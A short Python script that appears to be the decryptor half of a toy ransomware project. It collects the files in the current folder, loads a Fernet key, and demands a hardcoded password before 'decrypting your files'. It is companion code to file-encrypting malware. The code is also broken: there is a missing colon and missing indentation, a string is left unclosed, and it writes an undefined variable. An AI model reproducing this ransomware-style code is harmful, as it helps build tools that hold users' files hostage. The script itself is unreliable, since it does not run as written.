import os
from cryptography.fernet import Fernet

#let's find some files

files = []
for file in os.listdir()
if file == "voldemort.py" or file == "thekey.key" or file=="decrypt.py":
continue
if os.path.isfile(file):
files.append(file)

print(files)

with open("thekey.key","rb")as key:
secretkey=key.read();

password = "coffee"

user_input = input("Enter the password to decrypt your files)

if user_input == password:
	for file in files:
		with open(file, "rb") as thefile:
			contents = thefile.read()
		contents_decrypted = Fernet(secretkey).decrypt(contents)
		with open(file, "wb") as thefile:
			thefile.write(contents_encrypted)
		print("Congrats! your files are decrypted")
else:
	print("Sorry wrong password")